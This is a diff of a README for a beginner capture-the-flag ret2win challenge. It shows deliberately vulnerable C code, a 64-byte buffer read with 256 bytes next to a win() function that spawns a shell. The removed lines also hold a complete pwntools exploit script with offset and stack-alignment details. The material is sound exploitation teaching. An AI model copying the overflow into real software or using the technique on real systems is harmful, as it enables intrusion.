@@ -1,139 +1,150 @@
-# Challenge 02: Returnal - ret2win
+# RETURNAL
 
-**Difficulty**: ★★☆☆☆ Easy  
-**Binary**: `returnal`  
-**Port**: 1338  
-**Category**: Control Flow Hijacking / ret2win
+**Level:** Beginner
+**Category:** Pwn / Binary Exploitation
+**Technique:** Stack Buffer Overflow / Return Address Overwrite
+**Difficulty:** ⭐⭐☆☆☆
 
 ## Description
 
-The program has a `win()` function that spawns a shell, but it's never called. A `vulnerable()` function reads 256 bytes into a 64-byte buffer using `read()`. No PIE, no canary.
+Returnal is a beginner-level binary exploitation challenge designed to introduce
+players to controlling program execution through a **stack-based buffer
+overflow**.
 
-## Source Code Analysis
+The binary contains a vulnerable function that reads more data into a local
+stack buffer than the buffer can hold. This allows the player to overwrite
+data stored further up the stack, including the function's saved return
+address.
+
+The challenge does not provide the source code to the player. They must
+reverse-engineer enough of the binary to identify the vulnerability and locate
+the target function.
+
+## Intended Learning Objectives
+
+Players should learn how to:
+
+* Identify a buffer overflow vulnerability from a binary.
+* Inspect a binary using tools such as `file`, `objdump`, `readelf`, and `gdb`.
+* Identify interesting functions inside a binary.
+* Understand the basic layout of a stack frame.
+* Determine the offset between a local buffer and the saved return address.
+* Understand how return addresses control program execution.
+* Construct a basic ret2win-style payload.
+* Handle little-endian addresses when constructing a payload.
+
+## Vulnerability
+
+The vulnerable function effectively performs the equivalent of:
+
+```c
+void vulnerable(void)
+{
+    char buffer[64];
+
+    read(0, buffer, 256);
+}
+```
+
+The destination buffer is only **64 bytes**, while `read()` allows up to
+**256 bytes** to be written.
+
+This allows input to overflow the buffer and overwrite values stored in the
+stack frame.
+
+The intended target is the hidden `win()` function:
 
 ```c
 void win(void)
 {
-    puts("You found the secret!");
+    printf("You found the secret!\n");
     system("/bin/sh");
 }
-
-void vulnerable(void)
-{
-    char buffer[64];
-    read(0, buffer, 256);  // Reads 256 bytes into 64-byte buffer
-}
-
-int main(void)
-{
-    setvbuf(stdout, NULL, _IONBF, 0);
-    vulnerable();
-    return 0;
-}
 ```
 
-### Vulnerability
+The function is present in the binary but is not called during normal program
+execution.
 
-- `buffer` is 64 bytes
-- `read(0, buffer, 256)` reads 256 bytes
-- Overflow: 256 - 64 = 192 bytes of overflow
-- Overwrites saved RBP (8 bytes) and saved RIP (8 bytes)
+## Intended Solution
 
-## Binary Protections
+The intended exploitation path is:
+
+1. Inspect the binary and identify the available functions.
+2. Find the address of `win()`.
+3. Determine the number of bytes required to reach the saved return address.
+4. Construct a payload containing:
+
+   * padding up to the saved return address
+   * the address of `win()`
+5. Send the payload to the program.
+6. When `vulnerable()` returns, execution is redirected to `win()`.
+7. `win()` spawns a shell.
+
+This is essentially a **ret2win** challenge.
+
+## Mitigations
+
+The challenge is intentionally configured to keep the exploitation process
+simple for beginners.
+
+Expected relevant properties include:
+
+* No stack canary
+* No PIE
+* NX may remain enabled, since code injection is not required
+* The target function has a predictable address
+
+The exact compilation options should be kept consistent between the challenge
+binary and the deployed server binary.
+
+## Server
+
+The challenge is exposed through a TCP service.
 
 ```bash
-$ checksec --file=returnal
-Arch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
+nc localhost 1339
 ```
 
-- **No stack canary**
-- **No PIE** - `win()` address is static
-- **NX enabled** - can't execute shellcode on stack
+The server should execute the vulnerable binary and provide the player's input
+to it.
 
-## Exploitation: ret2win
+## Files
 
-Overwrite saved RIP with address of `win()`. When `vulnerable()` returns, it jumps to `win()`.
-
-### Step 1: Find `win()` Address
-
-```bash
-gdb ./returnal
-(gdb) info functions win
-(gdb) p win
-# Example: 0x401156
+```text
+Returnal/
+├── challenge.txt
+├── flag.txt
+├── README.md
+├── main.c
+├── returnal
+├── Dockerfile
+├── Makefile
+└── run.sh
 ```
 
-Or:
-```bash
-nm ./returnal | grep win
-objdump -d ./returnal | grep -A5 "<win>:"
-```
-
-### Step 2: Calculate Offset
-
-Buffer (64) + Saved RBP (8) = **72 bytes** to reach RIP.
-
-Verify with GDB:
-```bash
-gdb ./returnal
-(gdb) pattern create 100
-(gdb) run
-# Paste pattern
-(gdb) pattern offset $rsp
-```
-
-### Step 3: Craft Payload
-
-```python
-from pwn import *
-
-p = process('./returnal')
-# Or remote: p = remote('localhost', 1338)
-
-win_addr = 0x401156  # Replace with actual address
-offset = 72
-
-payload = b'A' * offset
-payload += p64(win_addr)
-
-p.sendline(payload)
-p.interactive()
-```
-
-### Stack Alignment Note
-
-On 64-bit glibc 2.27+, `system()` requires 16-byte stack alignment. If exploit crashes in `do_system`/`movaps`, add a `ret` gadget before `win()`:
-
-```python
-ret_gadget = 0x40101a  # Find with: ROPgadget --binary returnal | grep "^ 0x.*: ret$"
-payload = b'A' * offset
-payload += p64(ret_gadget)  # Align stack
-payload += p64(win_addr)
-```
+> `main.c` may be kept in the repository for challenge development and
+> documentation, but it should **not** be included in the player package.
 
 ## Flag
 
-Exploiting successfully gives an interactive shell. Read the flag:
+The flag is provided after successfully reaching the intended shell/function
+and completing the challenge.
 
-```bash
-cat /home/ctf/flag.txt
-# Or wherever flag.txt is in the container
+Flag format:
+
+```text
+0XATTACK{...}
 ```
 
-## Key Concepts Learned
+## Author Notes
 
-- Saved Return Address (RIP) control
-- Control Flow Hijacking
-- Little-endian encoding (`p64()`)
-- Binary protections: PIE, Canary, NX
-- Stack alignment for `system()` calls
+This challenge is intended to follow the introductory buffer-overflow
+challenge **Oopsie**.
 
-## Progressive Hints
+Where Oopsie focuses on understanding the basics of overflowing a stack
+buffer, Returnal introduces the next step: using the overflow to **control
+the saved return address and redirect execution to an existing function**.
 
-1. What does the `ret` instruction do? Where does it get the next address?
-2. Use `info functions` in GDB to find `win()` address
-3. Buffer is 64 bytes, saved RBP is 8 bytes. How many bytes to reach RIP?
+The challenge should therefore avoid unnecessary complications such as
+stack canaries, PIE, or requiring shellcode. The intended technique is a
+straightforward ret2win exploit.
